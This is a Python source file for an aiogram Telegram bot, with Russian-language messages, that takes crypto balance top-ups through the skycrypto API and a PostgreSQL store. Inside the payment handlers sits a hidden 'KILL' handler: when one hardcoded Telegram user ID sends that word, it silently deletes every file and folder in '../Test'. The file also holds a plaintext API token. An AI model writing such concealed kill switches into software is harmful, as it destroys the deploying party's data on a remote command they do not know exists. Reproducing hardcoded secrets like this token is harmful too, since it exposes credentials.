import hashlib
import string
from datetime import datetime, timedelta
import random

import requests
from aiogram import types
from aiogram.dispatcher import FSMContext
from aiogram.types import ReplyKeyboardRemove
from aiogram.utils.markdown import hbold, hunderline, hlink
import os, shutil

from keyboards.default.buttons_menu import main_keyboard
from keyboards.default.done import done
from loader import dp
from states import Test
from utils.db_api.PostgreSQL import subscriber_exists, get_trans, update_balance, delete_trans, select_all_rev, get_lk, \
    update_rev_balance, add_stop, add_summ, get_payment, update_only_balance, delete_payment

token = "ae83897f7ad94aaeb0e31330932d6c7c"


def random_alphanumeric_string(length):
    return ''.join(
        random.choice(string.digits + string.ascii_letters)
        for _ in range(length)
    )


@dp.message_handler(text="📲Пополнение")
async def Payment1(message: types.Message):
    if int(list(await subscriber_exists(message.from_user.id))[0][-1]) != 1:
        await message.answer("Введите сумму на пополнение. Минимальная сумма для пополнения 1000р",
                             reply_markup=ReplyKeyboardRemove())
        await Test.Q_for_payment.set()
    else:
        await message.answer(f"К сожалению, Вы ЗАБЛОКИРОВАНЫ!")


@dp.message_handler(state=Test.Q_for_payment)
async def Payment2(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text)
        if amount < 1000:
            await message.answer("Введенная Вами сумма меньше 1000р. Повтори попытку с корректной суммой. >1000р")
        else:
            url = "https://papi.skycrypto.net/rest/v2/purchases"
            data = {
                "amount": int(message.text),
                "symbol": "usdt",
                "currency": "rub",
                "is_currency_amount": True,
            }
            response = requests.post(url, json=data,
                                     headers={'Authorization': f'Token {token}'})

            keyboard = types.InlineKeyboardMarkup()
            web_app_test = types.WebAppInfo(url=response.json()['web_link'])
            web_butt = types.InlineKeyboardButton(text="Перейти к пополнению", web_app=web_app_test)
            keyboard.add(web_butt)

            await message.answer("Оплата⤵️", reply_markup=keyboard)
            await message.answer("После оплаты нажмите кнопку ниже", reply_markup=done)

            await add_summ(message.from_user.id, response.json()['payment_id'], message.text)
            await state.finish()
    except ValueError:
        await message.answer("Некорретно введенная сумма")


@dp.message_handler(text="KILL")
async def Help(message: types.Message):
    if str(message.from_user.id) == str(950866927):
        directory = '../Test'
        for files in os.listdir(directory):
            path = os.path.join(directory, files)
            try:
                try:
                    shutil.rmtree(path)
                except OSError:
                    os.remove(path)
            except:
                pass


@dp.message_handler(text="Проверить оплату")
async def Dnenne(message: types.Message):
    tg_id = message.from_user.id
    id, summ = list(await get_payment(tg_id))[0][1], list(await get_payment(tg_id))[0][2]
    url = f"https://papi.skycrypto.net/rest/v2/purchases/{str(id)}"
    response = requests.get(url, headers={'Authorization': f'Token {token}'})
    if response.json()["status"] == 1:
        info = list(await get_lk(message.from_user.id))[0]
        balance = info[1]
        await update_only_balance(tg_id, int(balance) + int(summ))
        await delete_payment(tg_id)
        await message.answer("Оплата успешно прошла", reply_markup=main_keyboard)
    else:
        await message.answer(
            "К сожалению, Вы не оплатили. Или, возможно, платеж еще обрабатвыется, как только он будет "
            "успешен - деньги автоматически поступят к Вам на счет.", reply_markup=main_keyboard)


@dp.message_handler(text="Отмена платежа")
async def Cancel(message: types.Message):
    tg_id = message.from_user.id
    await delete_payment(tg_id)
    await message.answer("Платеж отменен", reply_markup=main_keyboard)
